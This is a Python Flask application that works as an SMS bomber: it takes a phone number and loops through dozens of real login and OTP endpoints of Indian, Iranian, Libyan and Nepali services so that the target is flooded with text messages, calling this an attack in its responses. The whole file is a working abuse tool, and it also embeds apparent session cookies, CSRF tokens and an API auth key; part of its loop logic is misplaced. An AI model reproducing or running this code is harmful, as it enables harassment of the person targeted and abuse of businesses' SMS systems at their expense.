import os
import time
import requests
import threading
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
active_tasks = {}

def send_bomber(mobile):
    count = 1
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Accept": "*/*"
    }

    while active_tasks.get(mobile):
        print(f"--- Bombing Round {count} Started for {mobile} ---")
        
        # 1. JustDial (GET)
        try: session.get(f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={mobile}", headers=headers, timeout=5)
        except: pass

        # 2. ConfirmTkt (POST)
        try: session.post("https://securedapi.confirmtkt.com/api/platform/register", json={"mobileNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 3. Allen Solly (POST)
        try: session.post("https://www.allensolly.com/capillarylogin/validateMobileOrEMail", data={"mobileoremail": mobile}, headers=headers, timeout=5)
        except: pass

        # 4. Housing.com (POST)
        try: session.post("https://login.housing.com/api/v2/send-otp", json={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 5. Ajio (POST)
        try: session.post("https://login.web.ajio.com/api/auth/signupSendOTP", json={"mobileNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 6. Unacademy (POST)
        try: session.post("https://unacademy.com/api/v1/user/get_app_link/", data={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 7. Treebo (POST)
        try: session.post("https://www.treebo.com/api/v2/auth/login/otp/", json={"phone_number": mobile}, headers=headers, timeout=5)
        except: pass

        # 8. PharmEasy (POST)
        try: session.post("https://pharmeasy.in/api/auth/requestOTP", json={"contactNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 9. Dream11 (POST)
        try: session.post("https://api.dream11.com/sendsmslink", json={"mobileNum": mobile}, headers=headers, timeout=5)
        except: pass

        # 10. Cashify (GET)
        try: session.get(f"https://www.cashify.in/api/cu01/v1/app-link?mn={mobile}", headers=headers, timeout=5)
        except: pass

        # 11. KFC (POST)
        try: session.post("https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", json={"phoneNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 12. Airtel (GET)
        try: session.get(f"https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={mobile}", headers=headers, timeout=5)
        except: pass

        # 13. HappyEasyGo (GET)
        try: session.get(f"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91{mobile}", headers=headers, timeout=5)
        except: pass

        # 14. Porter (POST)
        try: session.post("https://porter.in/restservice/send_app_link_sms", json={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 15. IndiaLends (POST)
        try: session.post("https://indialends.com/internal/a/mobile-verification_v2.ashx", data={"jfsdfu14hkgertd": mobile}, headers=headers, timeout=5)
        except: pass
        apis = [
    {
        "name": "Snapp V1",
        "method": "POST",
        "url": "https://api.snapp.ir/api/v1/sms/link",
        "data": {"phone": mobile},
    },
    {
        "name": "Snapp V2",
        "method": "POST",
        "url": f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={mobile}",
        "data": {"cellphone": mobile},
    },
    {
        "name": "Achareh",
        "method": "POST",
        "url": "https://api.achareh.co/v2/accounts/login/",
        "data": {"phone": f"98{mobile[1:]}"},
    },
    {
        "name": "Zigap",
        "method": "POST",
        "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp",
        "data": {"phoneNumber": f"+98{mobile[1:]}"},
    },
    {
        "name": "Jabama",
        "method": "POST",
        "url": "https://gw.jabama.com/api/v4/account/send-code",
        "data": {"mobile": mobile},
    },
    {
        "name": "Banimode",
        "method": "POST",
        "url": "https://mobapi.banimode.com/api/v2/auth/request",
        "data": {"phone": mobile},
    },
    {
        "name": "Classino",
        "method": "POST",
        "url": "https://student.classino.com/otp/v1/api/login",
        "data": {"mobile": mobile},
    },
    {
        "name": "Digikala V1",
        "method": "POST",
        "url": "https://api.digikala.com/v1/user/authenticate/",
        "data": {"username": mobile, "otp_call": False},
    },
    {
        "name": "Digikala V2",
        "method": "POST",
        "url": "https://api.digikala.com/v1/user/forgot/check/",
        "data": {"username": mobile},
    },
    {
        "name": "Sms.ir",
        "method": "POST",
        "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code",
        "data": mobile,
    },
    {
        "name": "Alibaba",
        "method": "POST",
        "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
        "data": {"phoneNumber": mobile[1:]},
    },
    {
        "name": "Divar",
        "method": "POST",
        "url": "https://api.divar.ir/v5/auth/authenticate",
        "data": {"phone": mobile},
    },
    {
        "name": "Sheypoor",
        "method": "POST",
        "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
        "data": {"username": mobile},
    },
    {
        "name": "Bikoplus",
        "method": "POST",
        "url": "https://bikoplus.com/account/check-phone-number",
        "data": {"phoneNumber": mobile},
    },
    {
        "name": "Mootanroo",
        "method": "POST",
        "url": "https://api.mootanroo.com/api/v3/auth/send-otp",
        "data": {"PhoneNumber": mobile},
    },
    {
        "name": "Tap33",
        "method": "POST",
        "url": "https://tap33.me/api/v2/user",
        "data": {"credential": {"phoneNumber": mobile, "role": "BIKER"}},
    },
    {
        "name": "Tapsi",
        "method": "POST",
        "url": "https://api.tapsi.ir/api/v2.2/user",
        "data": {
            "credential": {"phoneNumber": mobile, "role": "DRIVER"},
            "otpOption": "SMS",
        },
    },
    {
        "name": "GapFilm",
        "method": "POST",
        "url": "https://core.gapfilm.ir/api/v3.1/Account/Login",
        "data": {"Type": "3", "Username": mobile[1:]},
    },
    {
        "name": "IToll",
        "method": "POST",
        "url": "https://app.itoll.com/api/v1/auth/login",
        "data": {"mobile": mobile},
    },
    {
        "name": "Anargift",
        "method": "POST",
        "url": "https://api.anargift.com/api/v1/auth/auth",
        "data": {"mobile_number": mobile},
    },
    {
        "name": "Nobat",
        "method": "POST",
        "url": "https://nobat.ir/api/public/patient/login/phone",
        "data": {"mobile": mobile[1:]},
    },
    {
        "name": "Lendo",
        "method": "POST",
        "url": "https://api.lendo.ir/api/customer/auth/send-otp",
        "data": {"mobile": mobile},
    },
    {
        "name": "Hamrah-Mechanic",
        "method": "POST",
        "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
        "data": {"PhoneNumber": mobile},
    },
    {
        "name": "Abantether",
        "method": "POST",
        "url": "https://abantether.com/users/register/phone/send/",
        "data": {"phoneNumber": mobile},
    },
    {
        "name": "OKCS",
        "method": "POST",
        "url": "https://my.okcs.com/api/check-mobile",
        "data": {"mobile": mobile},
    },
    {
        "name": "Tebinja",
        "method": "POST",
        "url": "https://www.tebinja.com/api/v1/users",
        "data": {"username": mobile},
    },
    {
        "name": "Bit24",
        "method": "POST",
        "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
        "data": {"mobile": mobile},
    },
    {
        "name": "Rojashop",
        "method": "POST",
        "url": "https://rojashop.com/api/send-otp-register",
        "data": {"mobile": mobile},
    },
    {
        "name": "Paklean",
        "method": "POST",
        "url": "https://client.api.paklean.com/download",
        "data": {"tel": mobile},
    },
    {
        "name": "Khodro45",
        "method": "POST",
        "url": "https://khodro45.com/api/v1/customers/otp/",
        "data": {"mobile": mobile},
    },
    {
        "name": "Delino",
        "method": "POST",
        "url": "https://www.delino.com/user/register",
        "data": {"mobile": mobile},
    },
    {
        "name": "DigikalaJet",
        "method": "POST",
        "url": "https://api.digikalajet.ir/user/login-register/",
        "data": {"phone": mobile},
    },
    {
        "name": "Miare",
        "method": "POST",
        "url": "https://www.miare.ir/api/otp/driver/request/",
        "data": {"phone_number": mobile},
    },
    {
        "name": "Dosma",
        "method": "POST",
        "url": "https://app.dosma.ir/api/v1/account/send-otp/",
        "data": {"mobile": mobile},
    },
    {
        "name": "Ostadkr",
        "method": "POST",
        "url": "https://api.ostadkr.com/login",
        "data": {"mobile": mobile},
    },
    {
        "name": "Sibbazar",
        "method": "POST",
        "url": "https://sandbox.sibbazar.com/api/v1/user/invite",
        "data": {"username": mobile},
    },
    {
        "name": "Namava",
        "method": "POST",
        "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
        "data": {"UserName": f"+98{mobile[1:]}"},
    },
    {
        "name": "Shab",
        "method": "POST",
        "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile",
        "data": {"mobile": mobile},
    },
    {
        "name": "Bitpin",
        "method": "POST",
        "url": "https://api.bitpin.org/v2/usr/signin/",
        "data": {"phone": mobile},
    },
    {
        "name": "Taaghche",
        "method": "POST",
        "url": "https://gw.taaghche.com/v4/site/auth/signup",
        "data": {"contact": mobile},
    },
    {
        "name": "Digipay",
        "method": "POST",
        "url": "https://www.mydigipay.com/digipay/api/users/send-sms",
        "data": {"cellNumber": mobile},
    },
    {
        "name": "3Via",
        "method": "POST",
        "url": "https://3via.ly/api/client/login",
        "data": {"msisdn": mobile, "device_type": "web"},
    },
    {
        "name": "Winmore",
        "method": "POST",
        "url": "https://winmore.ly/api/p10/public/get_started",
        "data": {"phone": mobile, "countryCode": "ly", "language": "en", "utm": {}},
    },
    {
        "name": "Lingo",
        "method": "POST",
        "url": "https://lingo.ly/api/client/login",
        "data": {"msisdn": mobile},
    },
    {
        "name": "Bekam",
        "method": "POST",
        "url": "https://bekam.ly/api/client/login",
        "data": {"msisdn": mobile},
    },
    {
        "name": "Daraz Nepal",
        "method": "POST",
        "url": "https://member.daraz.com.np/user/api/sendVerificationSms",
        "data": {
            "phone": mobile,
            "type": "OTP_REGISTER",
            "lzdAppVersion": "1.0",
            "X-CSRF-TOKEN": "57343b8557abe",
            "ncToken": {
                "csessionid": "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
                "sig": "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
                "token": "QPXW:1638536554908:0.22529358478093664",
            },
        },
        "headers": {
            "X-CSRF-TOKEN": "57343b8557abe",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://member.daraz.com.np",
            "Referer": "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
            "Cookie": "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
        },
    },
    {
        "name": "Clamphook",
        "method": "POST",
        "url": "https://backend.clamphook.com/auth/register",
        "data": {"mobile": mobile},
        "headers": {
            "Host": "backend.clamphook.com",
            "Origin": "https://clamphook.com",
            "Referer": "https://clamphook.com/",
            "Sec-Fetch-Mode": "cors",
        },
    },
    {
        "name": "Foodmario",
        "method": "POST",
        "url": "https://api.foodmario.com/api/v2/customer/send-otp",
        "data": {"phone": mobile},
    },
    {
        "name": "Sastodeal",
        "method": "POST",
        "url": "https://www.sastodeal.com/sd/otp_login_send_otp",
        "data": {"phone": mobile, "otp_type": "login"},
    },
    {
        "name": "confirmtkt",
        "method": "GET",
        "url": "https://securedapi.confirmtkt.com/api/platform/register",
        "data": {"newOtp": "true", "mobileNumber": mobile},
    },
    {
        "name": "justdial",
        "method": "GET",
        "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
        "data": {"mobile": mobile},
    },
    {
        "name": "allensolly",
        "method": "POST",
        "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
        "data": {"mobileoremail": mobile, "name": "markluther"},
    },
    {
        "name": "frotels",
        "method": "POST",
        "url": "https://www.frotels.com/appsendsms.php",
        "data": {"mobno": mobile},
    },
    {
        "name": "gapoon",
        "method": "POST",
        "url": "https://www.gapoon.com/userSignup",
        "data": {"mobile": mobile, "email": "noreply@gmail.com", "name": "LexLuthor"},
    },
    {
        "name": "housing",
        "method": "POST",
        "url": "https://login.housing.com/api/v2/send-otp",
        "data": {"phone": mobile},
    },
    {
        "name": "porter",
        "method": "POST",
        "url": "https://porter.in/restservice/send_app_link_sms",
        "data": {"phone": mobile, "referrer_string": "", "brand": "porter"},
    },
    {
        "name": "cityflo",
        "method": "POST",
        "url": "https://cityflo.com/website-app-download-link-sms/",
        "data": {"mobile_number": mobile},
    },
    {
        "name": "nnnow",
        "method": "POST",
        "url": "https://api.nnnow.com/d/api/appDownloadLink",
        "data": {"mobileNumber": mobile},
    },
    {
        "name": "ajio",
        "method": "POST",
        "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
        "data": {
            "firstName": "xxps",
            "login": "wiqpdl223@wqew.com",
            "password": "QASpw@1s",
            "genderType": "Male",
            "mobileNumber": mobile,
            "requestType": "SENDOTP",
        },
    },
    {
        "name": "happyeasygo",
        "method": "GET",
        "url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do",
        "data": {"phone": mobile},
    },
    {
        "name": "unacademy",
        "method": "POST",
        "url": "https://unacademy.com/api/v1/user/get_app_link/",
        "data": {"phone": mobile},
    },
    {
        "name": "treebo",
        "method": "POST",
        "url": "https://www.treebo.com/api/v2/auth/login/otp/",
        "data": {"phone_number": mobile},
    },
    {
        "name": "airtel",
        "method": "GET",
        "url": "https://www.airtel.in/referral-api/core/notify",
        "data": {"messageId": "map", "rtn": mobile},
    },
    {
        "name": "pharmeasy",
        "method": "POST",
        "url": "https://pharmeasy.in/api/auth/requestOTP",
        "data": {"contactNumber": mobile},
    },
    {
        "name": "mylescars",
        "method": "POST",
        "url": "https://www.mylescars.com/usermanagements/chkContact",
        "data": {"contactNo": mobile},
    },
    {
        "name": "grofers",
        "method": "POST",
        "url": "https://grofers.com/v2/accounts/",
        "data": {"user_phone": mobile},
        "headers": {
            "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
        },
    },
    {
        "name": "dream11",
        "method": "POST",
        "url": "https://api.dream11.com/sendsmslink",
        "data": {"siteId": "1", "mobileNum": mobile, "appType": "androidfull"},
    },
    {
        "name": "cashify",
        "method": "GET",
        "url": "https://www.cashify.in/api/cu01/v1/app-link",
        "data": {"mn": mobile},
    },
    {
        "name": "paytm",
        "method": "POST",
        "url": "https://commonfront.paytm.com/v4/api/sendsms",
        "data": {"phone": mobile, "guid": "2952fa812660c58dc160ca6c9894221d"},
    },
    {
        "name": "kfc-in",
        "method": "POST",
        "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
        "data": {"AuthorizedFor": "3", "phoneNumber": mobile, "Resend": "false"},
        "headers": {
            "Referer": "https://online.kfc.co.in/login",
            "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01",
        },
    },
    {
        "name": "indialends",
        "method": "POST",
        "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
        "data": {
            "aeyder03teaeare": "1",
            "ertysvfj74sje": "91",
            "jfsdfu14hkgertd": mobile,
            "lj80gertdfg": "0",
        },
        "headers": {"Referer": "https://indialends.com/personal-loan"},
    },
    {
        "name": "swiggy",
        "method": "POST",
        "url": "https://www.swiggy.com/dapi/auth/sms-otp",
        "data": {"mobile": mobile},
    },
    {
        "name": "zomato",
        "method": "POST",
        "url": "https://www.zomato.com/php/oauth_otp.php",
        "data": {"phone": mobile, "otp_via": "whatsapp"},
    },
    {
        "name": "bigbasket",
        "method": "POST",
        "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/send/",
        "data": {"phone": mobile, "channel": "sms"},
    },
    {
        "name": "amazon",
        "method": "POST",
        "url": "https://www.amazon.in/ap/signin",
        "data": {"email": mobile, "create": "0"},
    },
    {
        "name": "flipkart",
        "method": "POST",
        "url": "https://www.flipkart.com/api/6/user/signup/status",
        "data": {"loginId": mobile, "supportAllStates": "true"},
    },
    {
        "name": "myntra",
        "method": "POST",
        "url": "https://www.myntra.com/otp/generate",
        "data": {"phone": mobile},
    },
    {
        "name": "snapdeal",
        "method": "POST",
        "url": "https://www.snapdeal.com/authenticate/emailOrMobile",
        "data": {"mobile": mobile, "checkUser": "1"},
    },
    {
        "name": "ola",
        "method": "POST",
        "url": "https://api.olacabs.com/v1/oauth/otp",
        "data": {"phone": mobile},
    },
    {
        "name": "uber",
        "method": "POST",
        "url": "https://auth.uber.com/v2/oauth/token",
        "data": {
            "client_id": "eCAbBp7pFFl4kVJwyvjq1xdWfpeJyu1d",
            "phone": mobile,
            "scope": "eats.order",
        },
    },
    {
        "name": "rapido",
        "method": "POST",
        "url": "https://rapido.bike/Customer/authenticate",
        "data": {"phone": mobile},
    },
    {
        "name": "dominos",
        "method": "POST",
        "url": "https://order.godominos.co.in/Online/Verification.aspx/SendOTP",
        "data": {"MobileNo": mobile},
    },
    {
        "name": "pizzahut",
        "method": "POST",
        "url": "https://www.pizzahut.co.in/account/sendotp",
        "data": {"mobile": mobile, "email": "test@example.com"},
    },
    {
        "name": "twitter",
        "method": "POST",
        "url": "https://api.twitter.com/1.1/onboarding/task.json",
        "data": {"flow_token": "flow_token", "phone_number": mobile},
    },
    {
        "name": "facebook",
        "method": "POST",
        "url": "https://www.facebook.com/ajax/auth/send_sms_code.php",
        "data": {"phone": mobile, "firstrun": "true"},
    },
    {
        "name": "instagram",
        "method": "POST",
        "url": "https://www.instagram.com/accounts/send_signup_sms_code/",
        "data": {"phone_number": mobile},
    },
    {
        "name": "whatsapp",
        "method": "POST",
        "url": "https://web.whatsapp.com/api/check",
        "data": {"phone": mobile},
    },
]
    for api in apis:
        try:
            if api["method"] == "POST":
                session.post(api["url"], json=api["data"])
            elif api["method"] == "GET":
                session.get(api["url"])
        except:
            pass
            
    print(f"Round {count} Finished.")
    count += 1
    time.sleep(1)



@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bomber():
    mobile = request.form.get('mobile')
    if not mobile or len(mobile) != 10:
        return jsonify({"status": "error", "message": "Invalid 10-digit Number"})
    
    if mobile not in active_tasks or not active_tasks[mobile]:
        active_tasks[mobile] = True
        threading.Thread(target=send_bomber, args=(mobile,)).start()
        return jsonify({"status": "success", "message": f"Multi-API Attack Started on {mobile}"})
    return jsonify({"status": "info", "message": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_bomber():
    mobile = request.form.get('mobile')
    active_tasks[mobile] = False
    return jsonify({"status": "success", "message": "Attack Stopped"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)